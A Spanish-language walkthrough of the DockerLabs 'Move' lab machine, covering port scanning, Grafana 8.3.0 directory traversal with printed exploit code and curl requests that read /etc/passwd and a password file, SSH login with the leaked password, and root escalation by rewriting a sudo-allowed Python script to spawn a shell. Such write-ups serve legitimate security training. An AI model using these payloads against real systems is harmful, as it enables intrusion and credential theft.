# 🖥️ Writeup - Move 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

> **Tags:** `Linux` `Web` `Gobuster` `Searchsploit` `Directory Traversal` `Arbitrary File Read` `Python` `Sudoers` `Writable File`

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip move.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh move.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80,3000 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-16 15:45 +0100
Nmap scan report for 172.17.0.2
Host is up (0.000023s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   256 77:0b:34:36:87:0d:38:64:58:c0:6f:4e:cd:7a:3a:99 (ECDSA)
|_  256 1e:c6:b2:91:56:32:50:a5:03:45:f3:f7:32:ca:7b:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Debian))
|_http-server-header: Apache/2.4.58 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
```

Identificamos los puertos `22`, `80` y `3000` abiertos.

Accedemos al servicio web del puerto `80` y nos encontramos con una página de `Apache2` por defecto.

# GOBUSTER

Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,zip,php,txt,bak,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/maintenance.html     (Status: 200) [Size: 63]
Progress: 408385 / 1543899 (26.45%)
```

Encontramos un archivo llamado `maintenance.html`; cuando navegamos a dicho archivo, encontramos el siguiente mensaje:

```
Website under maintenance, access is in /tmp/pass.txt
```

Esto nos indica que podría haber algún tipo de credencial de acceso almacenada en `/tmp/pass.txt`.

No podemos avanzar más a través del puerto `80`, por lo que pasamos a inspeccionar el puerto `3000`, donde se está ejecutando una instancia de `Grafana`.

> Grafana es una plataforma de código abierto para la visualización y análisis de datos que permite crear dashboards interactivos a partir de diversas fuentes de métricas.

Accedemos al puerto `3000`.

![alt text](../../images/grrafana.png)

Nos encontramos con un panel de `login` de `Grafana`, en el cual también podemos visualizar la `versión` en la parte inferior de la pantalla.

```
v8.3.0
```

Investigamos si existen exploits asociados a esta versión específica.

```bash
searchsploit grafana 8.3.0
```

Info:
```
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                   | multiple/webapps/50581.py
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Encontramos un exploit para una vulnerabilidad de `Directory Traversal and Arbitrary File Read`, que nos permitiría leer el contenido de archivos del sistema, como `/etc/passwd` o el `/tmp/pass.txt` descubierto anteriormente.

# EXPLOTACIÓN

Nos copiamos el exploit en nuestro directorio actual.

```bash
cp /usr/share/exploitdb/exploits/multiple/webapps/50581.py .
```

Inspeccionamos su código para entender cómo funciona.

```bash
nano 50581.py
```

Info:
```py
import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
---------------------------<RESTO-DEL-CÓDIGO>-------------------------------------
```

Vemos que aprovecha la forma en que Grafana gestiona las rutas de los plugins para salir del directorio asignado y acceder a la raíz del sistema de archivos.

Esto lo logra enviando una petición como esta:

```
http://172.17.0.2:3000/public/plugins/<plugin>/../../../../../../../../etc/passwd
```

Existen varios `plugins` por defecto en Grafana, como `alertlis`t, `mysql` o `prometheus`. Vamos a probar manualmente utilizando uno de estos.

Realizamos una petición con `curl`:

```bash
curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```

Info:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
freddy:x:1000:1000::/home/freddy:/bin/bash
```

¡Funciona! Observamos que existe un usuario llamado `freddy`.

A continuación, leemos el contenido del archivo `/tmp/pass.txt` mencionado antes.

```bash
curl --path-as-is http://172.17.0.2:3000/public/plugins/alertlist/../../../../../../../../tmp/pass.txt
```

Info:
```
t9sH76gpQ82UFeZ3GXZS
```

Intentamos conectarnos a través del servicio `SSH` con el usuario `freddy` y las credenciales encontradas.

```bash
ssh freddy@172.17.0.2
```

Info:
```
(freddy㉿185b3883a185)-[~]
└─$ id
uid=1000(freddy) gid=1000(freddy) groups=1000(freddy)
```

# ESCALADA DE PRIVILEGIOS

Comprobamos permisos `sudo` y `SUID`.

```bash 
sudo -l
```

Info:
```
Matching Defaults entries for freddy on 185b3883a185:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User freddy may run the following commands on 185b3883a185:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

Vemos que podemos ejecutar el archivo `maintenance.py` con privilegios de `root`. Comprobamos los permisos que tenemos sobre dicho archivo.

```bash
cd /opt
ls -la
```

Info:
```
total 12
drwxrwxrwx 1 root   root   4096 Mar 29  2024 .
drwxr-xr-x 1 root   root   4096 Jan 16 14:44 ..
-rw-r--r-- 1 freddy freddy   35 Mar 29  2024 maintenance.py
```

Observamos que `freddy` es el propietario y tiene permisos de escritura.

Gracias a esto, podemos modificar el contenido del archivo para escalar privilegios.

```bash
nano maintenance.py
```

Código:
```py
import os
import pty

os.system("/bin/bash")
```

Guardamos el archivo modificado y, a continuación, aprovechamos los permisos de `sudo` para ejecutarlo y escalar a `root`.

```bash
sudo -u root /usr/bin/python3 /opt/maintenance.py
```

Info:
```
(root㉿185b3883a185)-[/opt]
└─# whoami
root
```

Ya somos root!